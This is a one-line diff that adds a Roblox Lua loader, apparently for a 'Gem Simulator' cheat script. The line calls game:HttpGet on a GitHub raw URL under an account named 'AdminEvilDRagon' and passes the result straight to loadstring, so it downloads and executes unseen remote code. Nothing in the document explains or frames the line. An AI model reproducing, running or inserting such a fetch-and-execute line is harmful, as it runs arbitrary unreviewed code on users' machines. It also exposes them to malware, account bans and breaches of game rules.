@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AdminEvilDRagon/Gem-Simulator/main/Gem%20Simulator.lua'))()
